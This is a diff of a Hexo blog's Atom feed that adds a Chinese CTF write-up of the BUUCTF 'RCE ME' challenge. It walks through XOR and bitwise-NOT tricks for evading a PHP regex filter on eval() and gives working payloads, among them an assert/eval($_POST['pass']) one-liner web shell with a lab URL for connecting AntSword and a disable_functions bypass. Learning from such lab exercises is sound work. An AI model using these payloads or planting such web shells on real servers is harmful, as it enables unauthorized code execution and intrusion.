@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-08-02T12:08:18.276Z</updated>
+  <updated>2021-08-04T10:05:54.660Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,12 +17,45 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>buuctf24</title>
+    <link href="http://example.com/2021/08/04/buuctf24/"/>
+    <id>http://example.com/2021/08/04/buuctf24/</id>
+    <published>2021-08-04T10:05:54.000Z</published>
+    <updated>2021-08-04T10:05:54.660Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>buuctf23</title>
+    <link href="http://example.com/2021/08/03/buuctf23/"/>
+    <id>http://example.com/2021/08/03/buuctf23/</id>
+    <published>2021-08-03T09:21:20.000Z</published>
+    <updated>2021-08-03T09:21:20.597Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>buuctf22</title>
     <link href="http://example.com/2021/08/02/buuctf22/"/>
     <id>http://example.com/2021/08/02/buuctf22/</id>
     <published>2021-08-02T12:02:24.000Z</published>
-    <updated>2021-08-02T12:08:18.276Z</updated>
+    <updated>2021-08-04T12:40:11.661Z</updated>
     
+    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>打开容器，发现一段源码：</p><p><img src="/buuctf22.assets/image-20210803172227133.png" alt="image-20210803172227133"></p><h4 id="一-代码审计"><a href="#一-代码审计" class="headerlink" title="一.代码审计"></a>一.代码审计</h4><p>通过GET方式获取变量$code；if语句判断变量$code的长度不能大于40，而且正则匹配过滤所有字母、数字。最后执行eval($code)</p><h4 id="二-预备知识"><a href="#二-预备知识" class="headerlink" title="二.预备知识"></a>二.预备知识</h4><h5 id="preg-match-绕过"><a href="#preg-match-绕过" class="headerlink" title="preg_match 绕过"></a><strong>preg_match 绕过</strong></h5><p><strong>法一：异或绕过</strong></p><p>在PHP中两个字符串（字符）异或之后，得到的还是一个字符串（字符）。如果正则过滤了一些字符串（字符），那就可以使用两个不在正则匹配范围内的字符串（字符）进行异或得到我们想要的字符串（字符）。</p><ul><li><p>举个例子：<code>?</code> 异或<code>~</code>的结果是<code>A</code></p></li><li><p>原理：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  0011 1111</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   &#x3D;   1</span><br><span class="line">0   XOR   1   &#x3D;   1</span><br><span class="line">0   XOR   0   &#x3D;   0</span><br><span class="line">1   XOR   1   &#x3D;   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br><span class="line"></span><br><span class="line">几个 位运算符：</span><br><span class="line">可以把1理解为真，0理解为假；那么就可以把“&amp;”理解为“与”，“|”理解为“或”；而对于“^”则是相同为就0，不同就为1。“~”为取反操作。</span><br></pre></td></tr></table></figure><p>知道了原理，我们就可以测试一下其他字符异或的结果是什么了，写个脚本测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">r&quot;`~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;\/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(str)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(str)):</span><br><span class="line">        a = ord(str[i])^ord(str[j])</span><br><span class="line">        print(str[i] + <span class="string">&#x27; ^ &#x27;</span> + str[j] + <span class="string">&#x27; is &#x27;</span> + chr(a))</span><br></pre></td></tr></table></figure><p>测试结果有很多，其中还有很多异或的结果是乱码，因此就不在这里展示了。后面有需要再从从中挑选即可。</p><p>这里举个例子，利用字符构造phpinfo()：（因为这里的变量名不能是字母，因此用下划线作变量名）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=<span class="string">&#x27;_@_)@;@&#x27;</span>^<span class="string">&#x27;/(/@.]/&#x27;</span>;$_();</span><br></pre></td></tr></table></figure><p><strong>法二：取反绕过</strong></p><p>取反的符号是~，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。</p><p>由于直接取反得到的结果可能会是乱码，所以我们要将其urlencode编码加以区分。</p><ul><li>下面举个例子：</li></ul><p><img src="/buuctf22.assets/image-20210803192217651.png" alt="image-20210803192217651"></p><p>这样我们上传<code>(~%8F%97%8F%96%91%99%90)()</code>，在URL栏经过一次URL解码后绕过<code>preg_match</code>正则匹配，eval函数执行取反得<code>phpinfo()</code>，然后再执行<code>phpinfo()</code>。</p><h4 id="三-思路构建"><a href="#三-思路构建" class="headerlink" title="三.思路构建"></a>三.思路构建</h4><p><strong>法一：异或绕过</strong></p><p>找出其中想要的字符来替代字符串phpinfo()</p><p><img src="/buuctf22.assets/image-20210803191105177.png" alt="image-20210803191105177"></p><p>payload：<code>?code=$_=&#39;_@_)@;@&#39;^&#39;/(/@.]/&#39;;$_();</code></p><p><strong>法二：取反绕过</strong></p><p>payload：<code>?code=(~%8F%97%8F%96%91%99%90)();</code></p><p>成功执行phpinfo()，看到服务器禁用了很多命令</p><p><img src="/buuctf22.assets/image-20210804134140157.png" alt="image-20210804134140157"></p><p>但是不妨碍我们构造一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_GET =&gt; ~(%A0%B8%BA%AB)</span><br><span class="line">    </span><br><span class="line">$_GET[__]($_GET[___]) =&gt; $&#123;$_&#125;[__]($&#123;$_&#125;[___])</span><br><span class="line"></span><br><span class="line">$_=~(%A0%B8%BA%AB);$&#123;$_&#125;[__]($&#123;$_&#125;[___]);&amp;__=assert&amp;___=<span class="keyword">eval</span>($_POST[%<span class="number">27</span>pass%<span class="number">27</span>]);</span><br></pre></td></tr></table></figure><p>蚁剑连接：<code>http://35a54d1b-8b71-41ce-9484-705341989a0e.node4.buuoj.cn:81/?code=$_=~(%A0%B8%BA%AB);$&#123;$_&#125;[__]($&#123;$_&#125;[___]);&amp;__=assert&amp;___=eval($_POST[%27pass%27]);</code></p><p><img src="/buuctf22.assets/image-20210804200542252.png" alt="image-20210804200542252"></p><p>连接后在根目录发现flag</p><p><img src="/buuctf22.assets/image-20210804200756686.png" alt="image-20210804200756686"></p><p>但是打开是个空文件，那应该是想我们通过<code>/readflag</code>去读取flag文件。但是打开readflag文件发现是乱码。看来是<code>disable_functions </code>禁用了太多函数，我们这个shell被限制了。因此我们需要绕开disable_functions。蚁剑有一个插件<code>绕过disable_functions</code>，选择PHP7_GC_UAF模式</p><p><img src="/buuctf22.assets/image-20210804201848927.png" alt="image-20210804201848927"></p><p>进入虚拟终端，再尝试执行<code>/readflag</code>，成功读取flag</p><p><img src="/buuctf22.assets/image-20210804202829554.png" alt="image-20210804202829554"></p><h4 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h4><p>感觉后半段获取flag的原理不是很懂，看了一些相关的文章感觉还是很懵，感觉有很大一片知识盲点</p><p>参考资料：</p><p><a href="https://www.freesion.com/article/4390641373/">https://www.freesion.com/article/4390641373/</a></p><p><a href="https://blog.csdn.net/weixin_43940853/article/details/105279340">https://blog.csdn.net/weixin_43940853/article/details/105279340</a></p><p><a href="https://www.liangzl.com/get-article-detail-181396.html">https://www.liangzl.com/get-article-detail-181396.html</a></p><p><a href="https://blog.csdn.net/crisprx/article/details/104349608">https://blog.csdn.net/crisprx/article/details/104349608</a></p><p><a href="https://www.hack6.com/217965/blog.html">https://www.hack6.com/217965/blog.html</a></p><p><a href="https://imagin.vip/?p=508">https://imagin.vip/?p=508</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;极客大挑战-2019-RCE-ME&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-RCE-ME&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]RCE ME&quot;&gt;&lt;/a&gt;[极客大挑战 2019]RCE ME&lt;/h1&gt;&lt;p&gt;打开容器，发现一</summary>
+      
     
     
     
